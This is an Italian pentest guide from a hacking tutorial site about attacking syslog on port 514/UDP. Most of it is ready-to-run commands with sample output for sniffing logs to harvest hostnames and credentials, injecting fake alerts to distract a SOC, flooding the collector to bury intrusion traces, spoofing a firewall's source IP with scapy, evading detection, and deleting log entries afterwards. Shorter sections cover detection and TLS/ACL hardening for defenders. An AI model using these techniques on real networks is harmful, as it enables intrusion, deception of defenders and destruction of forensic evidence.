---
title: 'Porta 514 Syslog: log in chiaro, syslog injection e rischio collector UDP'
slug: porta-514-syslog
description: 'Scopri cos’è la porta 514/UDP syslog, come identificare collector e flussi di logging, quali dati possono transitare in chiaro e perché syslog over TLS su 6514 riduce intercettazione e spoofing.'
image: /porta-514-syslog.webp
draft: true
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - syslog-injection
  - log-tampering
---

> **Executive Summary** — La porta 514 syslog riceve log di rete in chiaro via UDP da router, switch, server e appliance. Per un pentester è una fonte di intelligence passiva (hostname, errori, credenziali) e un vettore per log injection e tampering. Syslog non ha autenticazione nativa: chiunque può inviare messaggi falsi al collector. Questa guida copre intercettazione, injection, evasion e cleanup.

* Syslog sulla porta 514 trasmette log in chiaro via UDP — intercettabili da qualsiasi punto della rete
* Nessuna autenticazione: puoi iniettare log falsi nel collector per creare diversioni o inquinare le indagini
* I log intercettati rivelano hostname, IP interni, servizi attivi, errori di autenticazione e talvolta credenziali

Porta 514 syslog è il canale UDP su cui dispositivi di rete, server e applicazioni inviano messaggi di log verso un collector centralizzato. La porta 514 vulnerabilità strutturale è l'assenza di autenticazione e cifratura: qualsiasi host può inviare messaggi al collector e qualsiasi host sulla rete può sniffare i log in transito. L'enumerazione porta 514 rivela la topologia di logging dell'infrastruttura — chi logga dove, quali eventi vengono raccolti e quali no. Per il pentester, syslog è simultaneamente una fonte di intelligence passiva e un vettore di manipolazione. Nella kill chain si posiziona tra recon (raccolta info) e anti-forensics (log tampering post-exploitation).

## 1. Anatomia Tecnica della Porta 514

La porta 514 è registrata IANA come `syslog` su protocollo UDP. Il protocollo syslog (RFC 3164 legacy, RFC 5424 moderno) è un sistema fire-and-forget per il logging centralizzato.

Il flusso di un messaggio syslog:

1. Un evento si verifica su un device/server
2. Il sistema genera un messaggio syslog con facility, severity, timestamp, hostname e contenuto
3. Il messaggio viene inviato via UDP alla porta 514 del collector configurato
4. Il collector riceve, logga su file/database e opzionalmente genera alert

Le varianti sono syslog legacy (514/UDP, cleartext, nessun ack), rsyslog (514/UDP o TCP, supporta TLS), syslog-ng (514/UDP o TCP, filtri avanzati) e syslog over TLS (porta 6514/TCP, cifrato).

**Nota importante:** la porta 514/TCP è usata dal servizio `rsh` (Remote Shell) della famiglia r-commands BSD. Nello scan, distingui il protocollo: 514/UDP = syslog, 514/TCP = rsh. Questo articolo copre syslog (UDP).

```
Misconfig: Syslog in chiaro senza TLS
Impatto: tutti i log sono leggibili in transito — hostname, IP, errori auth, potenziali credenziali nei messaggi
Come si verifica: sudo tcpdump -i eth0 udp port 514 -A | head -20
```

```
Misconfig: Collector syslog che accetta da qualsiasi sorgente (no ACL)
Impatto: l'attacker può iniettare messaggi falsi nel collector per confondere il SOC
Come si verifica: logger -n [collector_ip] -P 514 --udp "TEST: injection test"
```

```
Misconfig: Log sensibili inviati via syslog (auth, credenziali, token)
Impatto: informazioni sensibili transitano in chiaro sulla rete
Come si verifica: sudo tcpdump -i eth0 udp port 514 -A | grep -iE "password|denied|failed|token"
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -p 514 -sV --reason 10.10.10.0/24
```

**Output atteso:**

```
PORT    STATE         SERVICE REASON
514/udp open          syslog  udp-response
514/udp open|filtered syslog  no-response
```

**Parametri:**

* `-sU`: scan UDP (syslog standard è esclusivamente UDP)
* `-p 514`: porta syslog
* `-sV`: tenta fingerprint del servizio (rsyslog, syslog-ng)
* `--reason`: distingue `open` (risposta ricevuta) da `open|filtered` (nessuna risposta)

### Comando 2: Listener syslog locale

```bash
sudo tcpdump -i eth0 udp port 514 -A -c 50
```

**Output atteso:**

```
14:30:01.123 IP 10.10.10.1.514 > 10.10.10.100.514:
<134>Feb  6 14:30:01 fw-core-01 %ASA-6-302013: Built outbound TCP connection 12345 for outside:203.0.113.50/443
14:30:02.456 IP 10.10.10.20.514 > 10.10.10.100.514:
<38>Feb  6 14:30:02 linux-web01 sshd[2345]: Failed password for admin from 10.10.10.99 port 54321 ssh2
14:30:03.789 IP 10.10.10.5.514 > 10.10.10.100.514:
<132>Feb  6 14:30:03 sw-access-03 %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to down
```

**Cosa ci dice questo output:** tre messaggi da tre device diversi. Il firewall `fw-core-01` logga connessioni outbound (Cisco ASA). Il server `linux-web01` logga un tentativo SSH fallito dall'IP 10.10.10.99 (qualcuno sta facendo brute force, o sei tu). Lo switch `sw-access-03` segnala un link down. Hai hostname interni, IP, servizi attivi e pattern di traffico — intelligence passiva di alta qualità.

## 3. Enumerazione Avanzata

### Cattura massiva con filtri

```bash
sudo tcpdump -i eth0 udp port 514 -A -w syslog_capture.pcap -c 5000
```

```bash
# Estrai intelligence
tcpdump -r syslog_capture.pcap -A | grep -oP '[\w.-]+(?=\s+%|\s+sshd|\s+\w+\[)' | sort -u
```

**Output:**

```
fw-core-01
fw-dmz-02
linux-web01
linux-db01
sw-access-03
sw-dist-01
wlc-main-01
```

**Lettura dell'output:** 7 hostname unici — hai la topologia del network monitoring. Firewall core e DMZ, web server, database, switch access e distribution, wireless controller. Questa mappa guida l'intero engagement. Per approfondire la fase di recon, consulta la [guida alla ricognizione di rete](https://hackita.it/articoli/enumeration).

### Estrazione credenziali e errori auth

```bash
tcpdump -r syslog_capture.pcap -A | grep -iE "failed|denied|invalid|password|authentication" | head -20
```

**Output:**

```
<38>Feb 6 14:31:01 linux-web01 sshd[2345]: Failed password for admin from 10.10.10.99 port 54321 ssh2
<38>Feb 6 14:31:03 linux-web01 sshd[2346]: Failed password for root from 10.10.10.99 port 54322 ssh2
<86>Feb 6 14:32:00 linux-db01 mysqld: Access denied for user 'backup'@'10.10.10.99' (using password: YES)
<86>Feb 6 14:33:00 fw-core-01 %ASA-6-113005: AAA user authentication Rejected : reason = Invalid password : server = 10.10.10.100 : user = admin
```

**Lettura dell'output:** qualcuno (IP 10.10.10.99) sta facendo brute force su SSH e MySQL. Il log del firewall rivela un tentativo AAA fallito con username `admin`. Se 10.10.10.99 è un altro membro del red team, hai un conflitto. Se non lo è, c'è un attaccante attivo sulla rete. Le [tecniche di detection](https://hackita.it/articoli/detection) del blue team si basano proprio su questi log.

### Identificazione del syslog collector

```bash
# Identifica a chi vanno i log
sudo tcpdump -i eth0 udp port 514 -n -c 100 | awk '{print $5}' | cut -d. -f1-4 | sort | uniq -c | sort -rn
```

**Output:**

```
     87 10.10.10.100
      8 10.10.10.101
      5 10.10.10.200
```

**Lettura dell'output:** 10.10.10.100 è il collector primario (87% del traffico). 10.10.10.101 è probabilmente un backup. 10.10.10.200 potrebbe essere un SIEM separato. Il collector primario è il target per log injection e, se compromesso, per log tampering. Per manipolazione log avanzata, vedi le [tecniche di anti-forensics](https://hackita.it/articoli/postexploitation).

## 4. Tecniche Offensive

**Log injection per diversione**

Contesto: collector syslog che accetta messaggi da qualsiasi sorgente. Inietti log falsi per confondere il SOC.

```bash
# Inietta falso alert critico dal "firewall"
logger -n 10.10.10.100 -P 514 --udp -p auth.crit -t "%ASA-1-106023" "Deny tcp src outside:203.0.113.100/443 dst inside:10.10.10.50/22 by access-group OUTSIDE"
```

**Output (successo):**

```
(nessun output = messaggio inviato. Verifica sul collector se è stato accettato)
```

**Output (fallimento):**

```
logger: send: Network unreachable
```

**Cosa fai dopo:** il SOC vede un alert critico di un presunto attacco dal firewall. Se reagiscono, hai creato una diversione mentre operi su un altro segmento. Combina con injection multipli da "sorgenti diverse" per simulare un incidente su larga scala. Scopri come integrare le [tecniche di social engineering](https://hackita.it/articoli/socialengineering) con log injection.

**Log flooding per denial of logging**

Contesto: vuoi saturare il collector durante un'operazione per impedire che i tuoi log reali vengano processati.

```bash
# Genera 10000 messaggi syslog in 60 secondi
for i in $(seq 1 10000); do
  logger -n 10.10.10.100 -P 514 --udp -p local0.info "Routine check $i: system nominal"
  sleep 0.006
done
```

**Output (successo):**

```
(nessun output diretto - il collector è saturo di messaggi noise)
```

**Cosa fai dopo:** durante il flooding, i tuoi log operativi (brute force, lateral movement) sono sommersi dal noise. Il SIEM potrebbe droppare messaggi per rate limiting. Usa questa finestra per operare. Nota: questa tecnica è ad alto rumore e va usata solo quando l'operazione lo giustifica.

**Syslog relay spoofing con scapy**

Contesto: inietti messaggi syslog con IP sorgente spoofato per far sembrare che provengano da un device legittimo.

```bash
python3 -c "
from scapy.all import *
pkt = IP(src='10.10.10.1', dst='10.10.10.100')/UDP(sport=514, dport=514)/Raw(load='<134>Feb  6 15:00:00 fw-core-01 %ASA-6-302013: Built outbound TCP connection 99999 for outside:198.51.100.10/443')
send(pkt, count=1, verbose=0)
print('[+] Spoofed syslog message sent as fw-core-01')
"
```

**Output (successo):**

```
[+] Spoofed syslog message sent as fw-core-01
```

**Cosa fai dopo:** il collector registra il messaggio come proveniente dal firewall (IP 10.10.10.1). Puoi iniettare qualsiasi evento — inclusi falsi "all clear" per mascherare attività reale.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con SIEM centralizzato

**Situazione:** rete corporate con 200+ device che loggano su un SIEM via syslog UDP. Hai compromesso un server nella VLAN server.

**Step 1:**

```bash
sudo tcpdump -i eth0 udp port 514 -A -c 200 | tee syslog_intel.txt
```

**Output atteso:**

```
(200 messaggi catturati con hostname, IP, servizi, errori)
```

**Step 2:**

```bash
grep -oP '\d+\.\d+\.\d+\.\d+' syslog_intel.txt | sort -u
```

**Output atteso:**

```
10.10.10.1
10.10.10.5
10.10.10.20
10.10.10.100
```

**Se fallisce:**

* Causa probabile: sei su una VLAN diversa, i log non transitano dal tuo segmento
* Fix: verifica VLAN con `ip addr` e se necessario fai [lateral movement](https://hackita.it/articoli/pivoting) verso la VLAN di management

**Tempo stimato:** 5-15 minuti di cattura passiva

### Scenario 2: OT/ICS con syslog non cifrato

**Situazione:** rete industriale con PLC e HMI che loggano su un collector syslog centrale. Nessuna cifratura.

**Step 1:**

```bash
sudo tcpdump -i eth0 udp port 514 -A | grep -i "plc\|scada\|hmi\|modbus"
```

**Output atteso:**

```
<131>Feb 6 15:10:00 plc-line01 ModbusTCP: Connection from 192.168.1.100 register write 40001=1
```

**Step 2:**

```bash
# Estrai tutti gli IP che comunicano Modbus
grep "ModbusTCP\|Connection from" syslog_ot.txt | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u
```

**Se fallisce:**

* Causa probabile: device OT loggano su protocolli proprietari, non syslog standard
* Fix: cattura tutto il traffico UDP sulla rete e filtra manualmente

**Tempo stimato:** 10-30 minuti

### Scenario 3: Lab/CTF con syslog come unica fonte di intel

**Situazione:** macchina CTF dove la flag è nascosta nei log. Il syslog collector è l'unico servizio accessibile.

**Step 1:**

```bash
nc -u -l -p 514 | tee ctf_logs.txt
```

**Output atteso:**

```
<134>Feb 6 15:30:00 ctf-target backup.sh: Backup completed. Key: FLAG{sysl0g_1nt3rc3pt}
```

**Step 2:**

```bash
grep -i "flag\|key\|secret\|password" ctf_logs.txt
```

**Se fallisce:**

* Causa probabile: il target non invia log al tuo IP
* Fix: fai ARP spoofing per intercettare il traffico verso il collector reale

**Tempo stimato:** 5-10 minuti

## 6. Attack Chain Completa

```
Recon (sniffing 514) → Intelligence (hostname, IP, servizi) → Log Injection (diversione) → Operation (lateral movement) → Log Tampering (cleanup)
```

| Fase         | Tool                | Comando chiave                                     | Output/Risultato         |
| ------------ | ------------------- | -------------------------------------------------- | ------------------------ |
| Recon        | tcpdump             | `tcpdump -i eth0 udp port 514 -A`                  | Hostname, IP, servizi    |
| Intelligence | grep                | `grep -iE "failed\|password" syslog.txt`           | Errori auth, credenziali |
| Diversione   | logger              | `logger -n [collector] -P 514 --udp "falso alert"` | SOC distratto            |
| Operation    | (vari)              | Lateral movement durante diversione                | Accesso target           |
| Cleanup      | (accesso collector) | Modifica/cancella log specifici                    | Tracce rimosse           |

**Timeline stimata:** la fase passiva (sniffing) può durare 15-60 minuti per raccogliere intelligence sufficiente. Injection e operation sono immediate.

**Ruolo della porta 514:** è il sistema nervoso del logging di rete. Chi controlla syslog controlla la narrativa — può leggere cosa succede, iniettare eventi falsi e cancellare tracce reali.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Rate anomale di messaggi**: un'improvvisa esplosione di log da un singolo IP può indicare flooding o injection
* **Sorgenti non autorizzate**: messaggi da IP non in whitelist nel collector
* **Contenuto anomalo**: messaggi con facility/severity incoerenti con il device sorgente
* **Assenza di log**: se un device smette di loggare (perché stai facendo ARP spoof), il SOC nota il gap

### Tecniche di Evasion

```
Tecnica: Sniffing puro senza injection
Come: solo tcpdump in modalità promiscua. Zero pacchetti inviati
Riduzione rumore: completamente invisibile — non generi traffico, non compari in nessun log
```

```
Tecnica: Injection con facility/severity coerenti
Come: studia i messaggi reali del device che vuoi impersonare (formato, facility, severity) e replica esattamente
Riduzione rumore: il messaggio iniettato è indistinguibile dai messaggi legittimi
```

```
Tecnica: Injection graduale (no burst)
Come: 1 messaggio ogni 30-60 secondi, mixato con traffico reale
Riduzione rumore: nessun spike di rate, invisibile a regole di anomaly detection
```

### Cleanup Post-Exploitation

* Se hai accesso al collector: `sed -i '/pattern_da_rimuovere/d' /var/log/syslog` (rimuove righe specifiche)
* Se usi rsyslog: i log potrebbero essere in MySQL — serve una DELETE mirata
* Ricorda che il SIEM potrebbe avere una copia separata — cancellare dal collector non basta se il SIEM ha già processato

## 8. Toolchain e Confronto

### Tabella comparativa

| Aspetto        | Syslog (514/UDP) | Syslog TLS (6514/TCP) | SNMP Trap (162/UDP) | Windows Event Log |
| -------------- | ---------------- | --------------------- | ------------------- | ----------------- |
| Porta          | 514              | 6514                  | 162                 | N/A (WMI/WinRM)   |
| Cifratura      | No               | Sì (TLS)              | Solo SNMPv3         | Sì (RPC)          |
| Autenticazione | No               | Sì (cert)             | Community string    | Kerberos          |
| Intercettabile | Sì (triviale)    | No (senza MitM TLS)   | Sì (v1/v2c)         | Difficile         |
| Injection      | Triviale         | No                    | Possibile           | Richiede accesso  |

## 9. Troubleshooting

| Errore / Sintomo                                      | Causa                                                        | Fix                                                                  |
| ----------------------------------------------------- | ------------------------------------------------------------ | -------------------------------------------------------------------- |
| Nmap `open\|filtered` su 514/udp                      | Nessuna risposta UDP (normale per syslog, è fire-and-forget) | Passa a sniffing passivo — syslog non risponde ai probe              |
| `tcpdump` non cattura nulla su 514                    | Sei su VLAN sbagliata o il traffico è TLS su 6514            | Verifica con `tcpdump -i eth0 udp port 514 or tcp port 6514`         |
| `logger` non genera errori ma il messaggio non appare | Collector ha ACL basata su IP sorgente                       | Prova da un IP diverso o con scapy per spoofing                      |
| Messaggi syslog troncati nel capture                  | Snap length di tcpdump troppo basso                          | Usa `-s 0` per cattura completa: `tcpdump -s 0 -i eth0 udp port 514` |

## 10. FAQ

**D: Come intercettare log syslog sulla porta 514 durante un pentest?**

R: Usa `sudo tcpdump -i eth0 udp port 514 -A` per catturare messaggi in transito. Funziona se sei sullo stesso segmento di rete del collector. Su reti switched serve ARP spoofing o accesso a una porta SPAN/mirror.

**D: Porta 514 è TCP o UDP?**

R: La porta 514/UDP è syslog. La porta 514/TCP è rsh (Remote Shell, r-command BSD). Sono servizi diversi sulla stessa porta ma su protocolli diversi. Nel pentest, specifica sempre il protocollo nello scan.

**D: Come iniettare messaggi syslog falsi?**

R: Con `logger -n [collector_ip] -P 514 --udp -p [facility.severity] "[messaggio]"`. Per spoofing dell'IP sorgente, usa scapy con pacchetti UDP crafted. Funziona perché syslog UDP non ha autenticazione.

**D: I log syslog possono contenere credenziali?**

R: Sì. Alcune applicazioni loggano credenziali in chiaro nei messaggi di errore (failed login con username/password, token API, stringhe di connessione database). Filtra con `grep -iE "password|token|key|secret"`.

**D: Come proteggere il syslog sulla porta 514?**

R: Migra a syslog over TLS (porta 6514) con rsyslog o syslog-ng. Configura ACL sul collector per accettare solo da sorgenti note. Usa mutual TLS authentication. Non loggare credenziali nei messaggi applicativi.

## 11. Cheat Sheet Finale

| Azione            | Comando                                                            | Note                       |
| ----------------- | ------------------------------------------------------------------ | -------------------------- |
| Scan syslog       | `nmap -sU -p 514 -sV [subnet]`                                     | UDP, spesso open\|filtered |
| Cattura live      | `sudo tcpdump -i eth0 udp port 514 -A`                             | Passivo, zero rumore       |
| Salva pcap        | `sudo tcpdump -i eth0 udp port 514 -w syslog.pcap -c 5000`         | Per analisi offline        |
| Estrai hostname   | `tcpdump -r syslog.pcap -A \| grep -oP '[\w.-]+(?=\s)' \| sort -u` | Mappa della rete           |
| Cerca credenziali | `tcpdump -r syslog.pcap -A \| grep -iE "password\|denied\|failed"` | Intelligence               |
| Log injection     | `logger -n [collector] -P 514 --udp "messaggio"`                   | Diversione                 |
| Spoof IP sorgente | Script scapy con IP(src=spoofed)                                   | Impersona un device        |
| Listener locale   | `nc -u -l -p 514`                                                  | Ricevi log (lab/CTF)       |

### Perché Porta 514 è rilevante nel 2026

La migrazione a syslog TLS è lenta. La maggioranza dei device di rete (switch, router, firewall, AP) continua a inviare log via UDP 514 in chiaro. In ambienti OT/ICS la situazione è peggiore — device con firmware datato supportano solo syslog legacy. Verifica sempre la presenza di traffico syslog non cifrato con `tcpdump` come primo step di intelligence passiva.

### Hardening e Mitigazione

* Migra a syslog over TLS: rsyslog con `action(type="omfwd" protocol="tcp" port="6514" StreamDriver="gtls")`
* Configura ACL sul collector: accetta solo da IP/subnet autorizzati
* Non loggare informazioni sensibili: filtra o maschera credenziali nei messaggi applicativi
* Monitora rate di messaggi per IP: spike anomali indicano injection o flooding

### OPSEC per il Red Team

Lo sniffing syslog è completamente passivo — zero rumore, zero log generati. Il rischio sale con l'injection: il collector logga l'IP sorgente di ogni messaggio ricevuto. Per massima invisibilità: limita l'attività all'intercettazione passiva. Se devi iniettare, usa scapy con IP spoofing per non esporre il tuo IP reale. Il flooding è ad alto rumore e va usato solo come ultimo resort durante operazioni che richiedono copertura immediata.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 3164 (BSD Syslog), RFC 5424 (Syslog Protocol), RFC 5425 (Syslog TLS). Fonte: [https://www.rfc-editor.org/rfc/rfc5424](https://www.rfc-editor.org/rfc/rfc5424)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
